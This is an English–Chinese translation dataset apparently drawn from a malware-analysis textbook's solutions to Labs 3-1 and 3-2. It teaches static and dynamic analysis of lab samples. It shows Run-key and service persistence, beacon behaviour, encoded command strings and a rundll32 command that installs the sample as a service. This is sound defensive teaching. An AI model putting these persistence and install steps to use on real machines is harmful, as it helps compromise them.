  id: totrans-768
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件看起来是打包的。唯一的导入是ExitProcess，尽管字符串看起来大部分都很清晰，并没有被混淆。
- en: 2\.
  id: totrans-769
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The malware creates a mutex named WinVMX32, copies itself into *C:\* *Windows\
    System32\vmx32to64.exe*. and installs itself to run on system startup by creating
    the registry key HKLM\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run\VideoDriver
    set to the copy location.
  id: totrans-770
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件创建一个名为WinVMX32的互斥锁，将其自身复制到 *C:\* *Windows\ System32\vmx32to64.exe*，并通过创建注册表键HKLM\SOFTWARE\Microsoft\Windows\
    CurrentVersion\Run\VideoDriver并将其设置为复制位置来安装自身，以便在系统启动时运行。
- en: 3\.
  id: totrans-771
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: The malware beacons a consistently sized 256-byte packet containing seemingly
    random data after resolving *www.practicalmalwareanalysis.com*.
  id: totrans-772
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在解析 *www.practicalmalwareanalysis.com* 后，发送一个大小一致的256字节数据包，其中包含看似随机的数据。
- en: '***Detailed Analysis***'
  id: totrans-773
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin with basic static analysis techniques, by looking at the malware’s
    PE
  id: totrans-774
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从基本的静态分析技术开始，查看恶意软件的PE
- en: file structure and strings. Figure 3-1L shows that only *kernel32.dll* is imported.
  id: totrans-775
  prefs: []
  type: TYPE_NORMAL
  zh: 文件结构和字符串。图3-1L显示，只导入了 *kernel32.dll*。
- en: '*Figure 3-1L: PEview of* Lab03-01.exe *showing only one import* **482**'
  id: totrans-776
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-1L：PEview显示Lab03-01.exe的导入只有* **482**'
- en: Appendix C
  id: totrans-777
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-778
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 95](index-516_1.png)'
  id: totrans-779
  prefs: []
  type: TYPE_IMG
  zh: '![Image 95](index-516_1.png)'
- en: There is only one import to this binary, ExitProcess, as seen at  in the import
    address table. Without any imports, it is tough to guess the program’s functionality.
    This program may be packed, since the imports will likely be resolved at runtime.
  id: totrans-780
  prefs: []
  type: TYPE_NORMAL
  zh: 该二进制文件只有一个导入，即ExitProcess，如导入地址表中的所示。没有导入，很难猜测程序的功能。这个程序可能是打包的，因为导入很可能会在运行时解析。
- en: '**3**'
  id: totrans-781
  prefs: []
  type: TYPE_NORMAL
  zh: '**3**'
- en: Next, we look at the strings, as shown in the following listing.
  id: totrans-782
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们查看字符串，如下所示。
- en: StubPath
  id: totrans-783
  prefs: []
  type: TYPE_NORMAL
  zh: StubPath
- en: SOFTWARE\Classes\http\shell\open\commandV
  id: totrans-784
  prefs: []
  type: TYPE_NORMAL
  zh: SOFTWARE\Classes\http\shell\open\commandV
- en: Software\Microsoft\Active Setup\Installed Components\
  id: totrans-785
  prefs: []
  type: TYPE_NORMAL
  zh: Software\Microsoft\Active Setup\Installed Components\
- en: test
  id: totrans-786
  prefs: []
  type: TYPE_NORMAL
  zh: test
- en: www.practicalmalwareanalysis.com
  id: totrans-787
  prefs: []
  type: TYPE_NORMAL
  zh: www.practicalmalwareanalysis.com
- en: admin
  id: totrans-788
  prefs: []
  type: TYPE_NORMAL
  zh: admin
- en: VideoDriver
  id: totrans-789
  prefs: []
  type: TYPE_NORMAL
  zh: VideoDriver
- en: WinVMX32-
  id: totrans-790
  prefs: []
  type: TYPE_NORMAL
  zh: WinVMX32-
- en: vmx32to64.exe
  id: totrans-791
  prefs: []
  type: TYPE_NORMAL
  zh: vmx32to64.exe
- en: SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  id: totrans-792
  prefs: []
  type: TYPE_NORMAL
  zh: SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- en: SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders AppData
  id: totrans-793
  prefs: []
  type: TYPE_NORMAL
  zh: SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders AppData
- en: We wouldn’t expect to see strings, since the imports led us to believe that
    the file is packed, but there are many interesting strings, such as registry locations
    and a domain name, as well as WinVMX32, VideoDriver, and vmx32to64.exe.
  id: totrans-794
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不会期望看到字符串，因为导入信息让我们认为文件是打包的，但有许多有趣的字符串，例如注册表位置和域名，以及WinVMX32、VideoDriver和vmx32to64.exe。
- en: Let’s see if basic dynamic analysis techniques will show us how these strings
    are used.
  id: totrans-795
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看基本的动态分析技术是否能够显示这些字符串的使用方式。
- en: Before we run the malware, we run procmon and clear out all events; start Process
    Explorer; and set up a virtual network, including ApateDNS, Netcat (listening
    on ports 80 and 443), and network capturing with Wireshark.
  id: totrans-796
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们运行恶意软件之前，我们运行procmon并清除所有事件；启动进程资源管理器；并设置一个虚拟网络，包括ApateDNS、Netcat（监听80和443端口）以及使用Wireshark的网络捕获。
- en: Once we run the malware, we start examining the process in Process Explorer,
    as shown in Figure 3-2L. We begin by clicking *Lab03-01.exe* in the process listing
    and select **View****Lower Pane View****Handles**. In this view, we can see
    that the malware has created the mutex named WinVMX32 at . We also select **View****Lower
    Pane View****DLLs** and see that the malware has dynamically loaded DLLs such
    as *ws2_32.dll* and *wshtcpip.dll*, which means that it has networking functionality.
  id: totrans-797
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们运行了恶意软件，我们开始在进程资源管理器中检查进程，如图3-2L所示。我们首先在进程列表中点击*Lab03-01.exe*，然后选择**视图****下窗格视图****句柄**。在这个视图中，我们可以看到恶意软件在处创建了一个名为WinVMX32的互斥锁。我们还选择**视图****下窗格视图****DLLs**，看到恶意软件动态加载了如*ws2_32.dll*和*wshtcpip.dll*等DLL，这意味着它具有网络功能。
- en: '*Figure 3-2L: Process Explorer view of* Lab03-01.exe'
  id: totrans-798
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-2L：Lab03-01.exe的进程资源管理器视图*'
- en: '*showing the mutex it creates*'
  id: totrans-799
  prefs: []
  type: TYPE_NORMAL
  zh: '*显示它创建的互斥锁*'
- en: Solutions to Labs
  id: totrans-800
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**483**'
  id: totrans-801
  prefs: []
  type: TYPE_NORMAL
  zh: '**483**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-802
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 96](index-517_1.png)'
  id: totrans-803
  prefs: []
  type: TYPE_IMG
  zh: '![图片96](index-517_1.png)'
- en: '![Image 97](index-517_2.png)'
  id: totrans-804
  prefs: []
  type: TYPE_IMG
  zh: '![图片97](index-517_2.png)'
- en: 'Next, we use procmon to look for additional information. We bring up the Filter
    dialog by selecting **Filter****Filter**, and then set three filters: one on
    the Process Name (to show what *Lab03-01.exe* does to the system), and two more
    on Operation, as shown in Figure 3-3L. We include RegSetValue and WriteFile to
    show changes the malware makes to the filesystem and registry.'
  id: totrans-805
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用procmon查找更多信息。我们通过选择**过滤****过滤**来打开过滤对话框，然后设置三个过滤器：一个在进程名称（以显示*Lab03-01.exe*对系统所做的操作），以及在操作上设置两个过滤器，如图3-3L所示。我们包括RegSetValue和WriteFile来显示恶意软件对文件系统和注册表的更改。
- en: '*Figure 3-3L: Process Monitor Filter dialog showing filters set on* *Process
    Name and Operation*'
  id: totrans-806
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-3L：进程监视器过滤对话框显示已设置在* *进程名称和操作* *上的过滤器*'
- en: Having set our filters, we click **Apply** to see the filtered result. The entries
    are reduced from thousands to just the 10 seen in Figure 3-4L. Notice that there
    is only one entry for WriteFile, and there are nine entries for RegSetValue.
  id: totrans-807
  prefs: []
  type: TYPE_NORMAL
  zh: 设置好我们的过滤器后，我们点击**应用**来查看过滤后的结果。条目从数千个减少到图3-4L中看到的仅10个。请注意，只有一条WriteFile条目，有九条RegSetValue条目。
- en: '*Figure 3-4L: Procmon filtered results (with three filters set)* As discussed
    in Chapter 3, we often need to filter out a certain amount of noise, such as entries
    0 and 3 through 9 in Figure 3-4L. The RegSetValue on HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed
    is typical noise in the results because the random number generator seed is constantly
    updated in the registry by software.'
  id: totrans-808
  prefs: []
  type: TYPE_NORMAL
  zh: '*图3-4L：Procmon过滤结果（设置了三个过滤器）* 如第3章所述，我们经常需要过滤掉一定量的噪声，如图3-4L中的条目0和3到9。HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed上的RegSetValue是结果中的典型噪声，因为随机数生成器的种子在注册表中不断由软件更新。'
- en: We are left with two interesting entries, as shown in Figure 3-4L at 
  id: totrans-809
  prefs: []
  type: TYPE_NORMAL
  zh: 我们剩下两个有趣的条目，如图3-4L所示。
- en: and . The first is the WriteFile operation at . Double-clicking this entry
    tells us that it wrote 7,168 bytes to *C:\WINDOWS\ system32\vmx32to64.exe*, which
    happens to be the same size as that of the file *Lab03-01.exe*. Opening Windows
    Explorer and browsing to that location shows that this newly created file has
    the same MD5 hash as *Lab03-01.exe*, which tells us that the malware has copied
    itself to that name and location. This can be a useful host-based indicator for
    the malware because it uses a hard-coded filename.
  id: totrans-810
  prefs: []
  type: TYPE_NORMAL
  zh: 和。第一个是处的WriteFile操作。双击此条目告诉我们，它向*C:\WINDOWS\ system32\vmx32to64.exe*写入了7,168字节，这个文件的大小恰好与*Lab03-01.exe*相同。打开Windows资源管理器并浏览到该位置，显示这个新创建的文件具有与*Lab03-01.exe*相同的MD5哈希值，这告诉我们恶意软件已经将该文件复制到该名称和位置。这可以是一个有用的基于主机的恶意软件指示器，因为它使用硬编码的文件名。
- en: '**484**'
  id: totrans-811
  prefs: []
  type: TYPE_NORMAL
  zh: '**484**'
- en: Appendix C
  id: totrans-812
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-813
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'Next, we double-click the entry at  in the figure, and see that the malware
    wrote the following data to the registry:'
  id: totrans-814
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们双击图中的条目，看到恶意软件向注册表中写入以下数据：
- en: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VideoDriver:C:\WINDOWS\system32\vmx32to64.exe
    **3**
  id: totrans-815
  prefs: []
  type: TYPE_NORMAL
  zh: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VideoDriver:C:\WINDOWS\system32\vmx32to64.exe
    **3**
- en: This newly created registry entry is used to run *vmx32to64.exe* on system startup
    using the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run location and creating
    a key named VideoDriver. We can now bring up procmon’s Filter dialog, remove the
    Operation filters, and slowly comb through the entries for any information we
    may have missed.
  id: totrans-816
  prefs: []
  type: TYPE_NORMAL
  zh: 这个新创建的注册表条目用于在系统启动时使用 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 位置运行
    *vmx32to64.exe*，并创建一个名为 VideoDriver 的键。我们现在可以打开 procmon 的过滤器对话框，移除操作过滤器，并慢慢检查条目以查找我们可能错过的任何信息。
- en: Next, we turn our attention to the network analysis tools we set up for basic
    dynamic analysis. First we check ApateDNS to see if the malware performed any
    DNS requests. Examining the output, we see a request for *www.practicalmalwareanalysis.com*,
    which matches the strings listing shown earlier. (To be sure that the malware
    has a chance to make additional DNS
  id: totrans-817
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将注意力转向我们为基本动态分析设置的网络分析工具。首先，我们检查 ApateDNS 以查看恶意软件是否执行了任何 DNS 请求。检查输出，我们看到一个对
    *www.practicalmalwareanalysis.com* 的请求，这与之前显示的字符串列表相匹配。（为确保恶意软件有机会执行额外的 DNS 请求，如果有的话，请执行分析过程几次以查看
    DNS 请求是否更改，或者使用 ApateDNS 的 NXDOMAIN 功能。）我们通过检查以下列表中的 Netcat 结果来完成网络分析。
- en: requests, if any, perform the analysis process a couple of times to see if the
    DNS request changes or use the NXDOMAIN functionality of ApateDNS.) We complete
    the network analysis by examining the Netcat results, as shown in the following
    listing.
  id: totrans-818
  prefs: []
  type: TYPE_NORMAL
  zh: 通过检查 Netcat 结果来完成网络分析，如下所示。
- en: C:\> **nc -l -p 443**
  id: totrans-819
  prefs: []
  type: TYPE_NORMAL
  zh: C:\> **nc -l -p 443**
- en: \7⌠ëÅ¿A :°I,j!Yûöí?Ç:lƒh↨O±ⁿ)α←εg%┬∟#xp╧O+╙3Ω☺åiE☼?═■p}»╝/
  id: totrans-820
  prefs: []
  type: TYPE_NORMAL
  zh: \7⌠ëÅ¿A :°I,j!Yûöí?Ç:lƒh↨O±ⁿ)α←εg%┬∟#xp╧O+╙3Ω☺åiE☼?═■p}»╝/
- en: º_∞~]ò£»ú¿¼▬F^"Äμ▒├
  id: totrans-821
  prefs: []
  type: TYPE_NORMAL
  zh: º_∞~]ò£»ú¿¼▬F^"Äμ▒├
- en: ♦∟ªòj╡<û(y!∟♫5Z☺!♀va╪┴╗úI┤ßX╤â8╫²ñö'i¢k╢╓(√Q‼%O¶╡9.▐σÅw♀‼±Wm^┐#ñæ╬°☻/
  id: totrans-822
  prefs: []
  type: TYPE_NORMAL
  zh: ♦∟ªòj╡<û(y!∟♫5Z☺!♀va╪┴╗úI┤ßX╤â8╫²ñö'i¢k╢╓(√Q‼%O¶╡9.▐σÅw♀‼±Wm^┐#ñæ╬°☻/
- en: '[⌠│⌡xH╫▲É║‼'
  id: totrans-823
  prefs: []
  type: TYPE_NORMAL
  zh: '[⌠│⌡xH╫▲É║‼'
- en: x?╦Æº│ºLƒ↕x┌gYΦ<└§☻μºx)╤SBxè↕◄╟♂4AÇ
  id: totrans-824
  prefs: []
  type: TYPE_NORMAL
  zh: x?╦Æº│ºLƒ↕x┌gYΦ<└§☻μºx)╤SBxè↕◄╟♂4AÇ
- en: 'It looks like we got lucky: The malware appears to beacon out over port 443,
    and we were listening with Netcat over ports 80 and 443\. (Use INetSim to listen
    on all ports at once.) We run this test several times, and the data appears to
    be random each time.'
  id: totrans-825
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来我们很幸运：恶意软件似乎通过端口 443 发出信标，而我们正在端口 80 和 443 上使用 Netcat 进行监听。（使用 INetSim 同时监听所有端口。）我们运行这个测试几次，每次的数据似乎都是随机的。
- en: A follow-up in Wireshark tells us that the beacon packets are of consistent
    size (256 bytes) and appear to contain random data not related to the SSL protocol
    that normally operates over port 443\.
  id: totrans-826
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Wireshark 中的后续分析告诉我们，信标数据包的大小（256 字节）是一致的，并且看起来包含与通常在端口 443 上运行的 SSL 协议无关的随机数据。
- en: '**Lab 3-2 Solutions**'
  id: totrans-827
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 3-2 解决方案**'
- en: '***Short Answers***'
  id: totrans-828
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-829
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: To install the malware as a service, run the malware’s exported installA function
    via *rundll32.exe* with **rundll32.exe Lab03-02.dll,installA**.
  id: totrans-830
  prefs: []
  type: TYPE_NORMAL
  zh: 要将恶意软件作为服务安装，通过 *rundll32.exe* 运行恶意软件的导出安装函数，使用 **rundll32.exe Lab03-02.dll,installA**。
- en: 2\.
  id: totrans-831
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: To run the malware, start the service it installs using the net command **net
    start IPRIP**.
  id: totrans-832
  prefs: []
  type: TYPE_NORMAL
  zh: 要运行恶意软件，使用 net 命令启动它安装的服务 **net start IPRIP**。
- en: 3\.
  id: totrans-833
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: Use Process Explorer to determine which process is running the service.
  id: totrans-834
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Process Explorer 确定运行服务的进程。
- en: Since the malware will be running within one of the *svchost.exe* files on the
    system, hover over each one until you see the service name, or search for *Lab03-02.dll*
    using the Find DLL feature of Process Explorer.
  id: totrans-835
  prefs: []
  type: TYPE_NORMAL
  zh: 由于恶意软件将在系统上的某个 *svchost.exe* 文件中运行，因此悬停在每一个文件上，直到你看到服务名称，或者使用 Process Explorer
    的查找 DLL 功能搜索 *Lab03-02.dll*。
- en: Solutions to Labs
  id: totrans-836
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**485**'
  id: totrans-837
  prefs: []
  type: TYPE_NORMAL
  zh: '**485**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-838
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 98](index-519_1.png)'
  id: totrans-839
  prefs: []
  type: TYPE_IMG
  zh: '![图片 98](index-519_1.png)'
- en: 4\.
  id: totrans-840
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: In procmon you can filter on the PID you found using Process Explorer.
  id: totrans-841
  prefs: []
  type: TYPE_NORMAL
  zh: 在 procmon 中，你可以使用 Process Explorer 找到的 PID 进行过滤。
- en: 5\.
  id: totrans-842
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: 'By default, the malware installs as the service IPRIP with a display name of
    Intranet Network Awareness (INA+) and description of “Depends INA+, Collects and
    stores network configuration and location information, and notifies applications
    when this information changes.” It installs itself for persistence in the registry
    at HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ Parameters\ServiceDll: %CurrentDirectory%\Lab03-02.dll.
    If you rename *Lab03-02.dll* to something else, such as *malware.dll*, then it
    writes *malware.dll* into the registry key, instead of using the name *Lab03-02.dll*.'
  id: totrans-843
  prefs: []
  type: TYPE_NORMAL
  zh: '默认情况下，恶意软件以服务 IPRIP 安装，显示名称为 Intranet Network Awareness (INA+)，描述为“依赖 INA+，收集和存储网络配置和位置信息，并在信息更改时通知应用程序。”它将自己注册到注册表
    HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ Parameters\ServiceDll: %CurrentDirectory%\Lab03-02.dll
    中以实现持久性。如果你将 *Lab03-02.dll* 重命名为其他名称，例如 *malware.dll*，那么它将把 *malware.dll* 写入注册表键，而不是使用
    *Lab03-02.dll* 的名称。'
- en: 6\.
  id: totrans-844
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The malware resolves the domain name *practicalmalwareanalysis.com* and connects
    to that host over port 80 using what appears to be HTTP. It does a GET request
    for *serve.html* and uses the User-Agent %ComputerName%
  id: totrans-845
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件解析域名 *practicalmalwareanalysis.com* 并通过端口 80 连接到该主机，看起来像是使用 HTTP。它对 *serve.html*
    进行 GET 请求并使用 %ComputerName% 的 User-Agent。
- en: Windows XP 6.11\.
  id: totrans-846
  prefs: []
  type: TYPE_NORMAL
  zh: Windows XP 6.11\.
- en: '***Detailed Analysis***'
  id: totrans-847
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin with basic static analysis by looking at the PE file structure and
    strings. Figure 3-5L shows that this DLL has five exports, as listed from  and
    below. The export ServiceMain suggests that this malware needs to be installed
    as a service in order to run properly.
  id: totrans-848
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从查看 PE 文件结构和字符串的基本静态分析开始。图 3-5L 显示该 DLL 有五个导出，如下所示。导出 ServiceMain 表明该恶意软件需要作为服务安装才能正常运行。
- en: '*Figure 3-5L: PEview of* Lab03-02.dll *exports* The following listing shows
    the malware’s interesting imported functions in bold.'
  id: totrans-849
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 3-5L：Lab03-02.dll 的 PE 视图导出* 以下列表显示了恶意软件中用粗体标出的有趣导入函数。'
- en: OpenService
  id: totrans-850
  prefs: []
  type: TYPE_NORMAL
  zh: OpenService
- en: DeleteService
  id: totrans-851
  prefs: []
  type: TYPE_NORMAL
  zh: DeleteService
- en: OpenSCManager
  id: totrans-852
  prefs: []
  type: TYPE_NORMAL
  zh: OpenSCManager
- en: '**CreateService**'
  id: totrans-853
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateService**'
- en: RegOpenKeyEx
  id: totrans-854
  prefs: []
  type: TYPE_NORMAL
  zh: RegOpenKeyEx
- en: '**486**'
  id: totrans-855
  prefs: []
  type: TYPE_NORMAL
  zh: '**486**'
- en: Appendix C
  id: totrans-856
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-857
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: RegQueryValueEx
  id: totrans-858
  prefs: []
  type: TYPE_NORMAL
  zh: RegQueryValueEx
- en: RegCreateKey
  id: totrans-859
  prefs: []
  type: TYPE_NORMAL
  zh: RegCreateKey
- en: '**RegSetValueEx**'
  id: totrans-860
  prefs: []
  type: TYPE_NORMAL
  zh: '**RegSetValueEx**'
- en: InternetOpen
  id: totrans-861
  prefs: []
  type: TYPE_NORMAL
  zh: InternetOpen
- en: InternetConnect
  id: totrans-862
  prefs: []
  type: TYPE_NORMAL
  zh: InternetConnect
- en: '**3**'
  id: totrans-863
  prefs: []
  type: TYPE_NORMAL
  zh: '**3**'
- en: HttpOpenRequest
  id: totrans-864
  prefs: []
  type: TYPE_NORMAL
  zh: HttpOpenRequest
- en: '**HttpSendRequest**'
  id: totrans-865
  prefs: []
  type: TYPE_NORMAL
  zh: '**HttpSendRequest**'
- en: InternetReadFile
  id: totrans-866
  prefs: []
  type: TYPE_NORMAL
  zh: InternetReadFile
- en: These include service-manipulation functions, such as CreateService, and registry-manipulation
    functions, such as RegSetValueEx. Imported networking functions, such as HttpSendRequest,
    suggest that the malware uses HTTP.
  id: totrans-867
  prefs: []
  type: TYPE_NORMAL
  zh: 这些包括服务操作函数，如 CreateService，以及注册表操作函数，如 RegSetValueEx。导入的网络函数，如 HttpSendRequest，表明恶意软件使用
    HTTP。
- en: Next, we examine the strings, as shown in the following listing.
  id: totrans-868
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查字符串，如下所示。
- en: Y29ubmVjdA==
  id: totrans-869
  prefs: []
  type: TYPE_NORMAL
  zh: Y29ubmVjdA==
- en: practicalmalwareanalysis.com
  id: totrans-870
  prefs: []
  type: TYPE_NORMAL
  zh: practicalmalwareanalysis.com
- en: serve.html
  id: totrans-871
  prefs: []
  type: TYPE_NORMAL
  zh: serve.html
- en: dW5zdXBwb3J0
  id: totrans-872
  prefs: []
  type: TYPE_NORMAL
  zh: dW5zdXBwb3J0
- en: c2xlZXA=
  id: totrans-873
  prefs: []
  type: TYPE_NORMAL
  zh: c2xlZXA=
- en: Y21k
  id: totrans-874
  prefs: []
  type: TYPE_NORMAL
  zh: Y21k
- en: cXVpdA==
  id: totrans-875
  prefs: []
  type: TYPE_NORMAL
  zh: cXVpdA==
- en: Windows XP 6.11
  id: totrans-876
  prefs: []
  type: TYPE_NORMAL
  zh: Windows XP 6.11
- en: HTTP/1.1
  id: totrans-877
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP/1.1
- en: quit
  id: totrans-878
  prefs: []
  type: TYPE_NORMAL
  zh: quit
- en: exit
  id: totrans-879
  prefs: []
  type: TYPE_NORMAL
  zh: exit
- en: getfile
  id: totrans-880
  prefs: []
  type: TYPE_NORMAL
  zh: getfile
- en: cmd.exe /c
  id: totrans-881
  prefs: []
  type: TYPE_NORMAL
  zh: cmd.exe /c
- en: Depends INA+, Collects and stores network configuration and location information,
    and notifies applications when this information changes.
  id: totrans-882
  prefs: []
  type: TYPE_NORMAL
  zh: Depends INA+，收集并存储网络配置和位置信息，并在信息更改时通知应用程序。
- en: '%SystemRoot%\System32\svchost.exe -k'
  id: totrans-883
  prefs: []
  type: TYPE_NORMAL
  zh: '%SystemRoot%\System32\svchost.exe -k'
- en: SYSTEM\CurrentControlSet\Services\
  id: totrans-884
  prefs: []
  type: TYPE_NORMAL
  zh: SYSTEM\CurrentControlSet\Services\
- en: Intranet Network Awareness (INA+)
  id: totrans-885
  prefs: []
  type: TYPE_NORMAL
  zh: 内部网络意识 (INA+)
- en: '%SystemRoot%\System32\svchost.exe -k netsvcs'
  id: totrans-886
  prefs: []
  type: TYPE_NORMAL
  zh: '%SystemRoot%\System32\svchost.exe -k netsvcs'
- en: netsvcs
  id: totrans-887
  prefs: []
  type: TYPE_NORMAL
  zh: netsvcs
- en: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
  id: totrans-888
  prefs: []
  type: TYPE_NORMAL
  zh: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
- en: IPRIP
  id: totrans-889
  prefs: []
  type: TYPE_NORMAL
  zh: IPRIP
- en: We see several interesting strings, including registry locations, a domain name,
    unique strings like IPRIP and serve.html, and a variety of encoded strings.
  id: totrans-890
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到一些有趣的字符串，包括注册表位置、域名、独特的字符串如 IPRIP 和 serve.html，以及各种编码字符串。
- en: Basic dynamic techniques may show us how these strings and imports are used.
  id: totrans-891
  prefs: []
  type: TYPE_NORMAL
  zh: 基本动态技术可能向我们展示这些字符串和导入是如何被使用的。
- en: The results of our basic static analysis techniques lead us to believe that
    this malware needs to be installed as a service using the exported function installA.
    We’ll use that function to attempt to install this malware, but before we do that,
    we’ll launch Regshot to take a baseline snapshot of the registry and use Process
    Explorer to monitor the processes running on the system.
  id: totrans-892
  prefs: []
  type: TYPE_NORMAL
  zh: 我们基本静态分析技术的结果使我们相信，该恶意软件需要使用导出的函数 installA 作为服务安装。我们将使用该函数尝试安装恶意软件，但在我们这样做之前，我们将启动
    Regshot 以获取注册表的基线快照，并使用 Process Explorer 来监控系统上运行的进程。
- en: 'After setting up Regshot and Process Explorer, we install the malware using
    *rundll32.exe*, as follows:'
  id: totrans-893
  prefs: []
  type: TYPE_NORMAL
  zh: 在设置好 Regshot 和 Process Explorer 后，我们使用 *rundll32.exe* 安装恶意软件，如下所示：
- en: C:\> **rundll32.exe Lab03-02.dll,installA**
  id: totrans-894
  prefs: []
  type: TYPE_NORMAL
  zh: C:\> **rundll32.exe Lab03-02.dll,installA**
- en: Solutions to Labs
  id: totrans-895
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**487**'
  id: totrans-896
  prefs: []
  type: TYPE_NORMAL
  zh: '**487**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-897
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: After installing the malware, we use Process Explorer to confirm that it has
    terminated by making sure that *rundll32.exe* is no longer in the process listing.
    Next, we take a second snapshot with Regshot to see if the malware installed itself
    in the registry.
  id: totrans-898
  prefs: []
  type: TYPE_NORMAL
  zh: 安装恶意软件后，我们使用 Process Explorer 来确认它已终止，确保 *rundll32.exe* 不再在进程列表中。然后，我们使用 Regshot
    再次拍摄快照，以查看恶意软件是否已将自己安装在注册表中。
- en: The edited Regshot results are shown in the following listing.
  id: totrans-899
  prefs: []
  type: TYPE_NORMAL
  zh: 以下列表显示了编辑后的 Regshot 结果。
- en: '----------------------------------'
  id: totrans-900
  prefs: []
  type: TYPE_NORMAL
  zh: '----------------------------------'
- en: Keys added
  id: totrans-901
  prefs: []
  type: TYPE_NORMAL
  zh: 添加的键
- en: '----------------------------------'
  id: totrans-902
  prefs: []
  type: TYPE_NORMAL
  zh: '----------------------------------'
- en: HKLM\SYSTEM\CurrentControlSet\Services\IPRIP 
  id: totrans-903
  prefs: []
  type: TYPE_NORMAL
  zh: HKLM\SYSTEM\CurrentControlSet\Services\IPRIP 
- en: '----------------------------------'
  id: totrans-904
  prefs: []
  type: TYPE_NORMAL
  zh: '----------------------------------'
- en: Values added
  id: totrans-905
  prefs: []
  type: TYPE_NORMAL
  zh: Values added
- en: '----------------------------------'
  id: totrans-906
  prefs: []
  type: TYPE_NORMAL
  zh: '----------------------------------'
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Parameters\ServiceDll:'
  id: totrans-907
  prefs: []
  type: TYPE_NORMAL
  zh: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Parameters\ServiceDll:'
- en: '"z:\Lab03-02.dll"'
  id: totrans-908
  prefs: []
  type: TYPE_NORMAL
  zh: '"z:\Lab03-02.dll"'
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ImagePath:'
  id: totrans-909
  prefs: []
  type: TYPE_NORMAL
  zh: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ImagePath:'
- en: '"%SystemRoot%\System32\svchost.exe -k netsvcs" '
  id: totrans-910
  prefs: []
  type: TYPE_NORMAL
  zh: '"%SystemRoot%\System32\svchost.exe -k netsvcs" '
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\DisplayName:'
